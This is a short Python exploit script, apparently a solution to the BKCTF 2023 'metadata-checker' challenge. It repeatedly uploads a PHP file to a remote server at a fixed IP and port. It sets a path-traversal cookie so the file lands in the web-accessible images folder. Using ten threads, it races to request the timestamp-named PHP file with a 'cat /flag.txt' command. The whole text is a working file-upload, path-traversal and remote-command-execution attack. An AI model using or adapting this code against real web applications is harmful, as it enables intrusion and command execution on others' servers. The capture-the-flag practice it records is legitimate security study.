import time
import requests
from urllib.parse import quote
from multiprocessing.dummy import Pool as ThreadPool

current_timestamp = int(time.time())
print("Current timestamp: ", current_timestamp)
new_timestamp = current_timestamp + 3
print("New timestamp:", new_timestamp)


cmd = "cat /flag.txt"

download_path = f"assets/images/_{new_timestamp}_a.php?cmd={quote(cmd)}"
download_url_with_timestamp = f"http://18.141.143.171:31498/{download_path}"

cookie = {"user": "../www/html/assets/images/"}


def get(i):
    while True:
        with open("D:\\web\\web\\web_exploit\\Writeup_CTF\\CTF_and_solve_challenge_not_WU\\BKCTF\\bkctf2023-metadata-checker\\downloadable\\metadata-checker\\a.php", "rb") as file:
            response = requests.post(
                "http://18.141.143.171:31498/index.php", files={"image": file}, cookies=cookie)

        response = requests.get(download_url_with_timestamp)
        if "BKSEC" in response.text:
            print("FLAG FOUND!")
            print(response.text)
            break


pool = ThreadPool(10)
result = pool.map_async(get, range(20)).get(20)
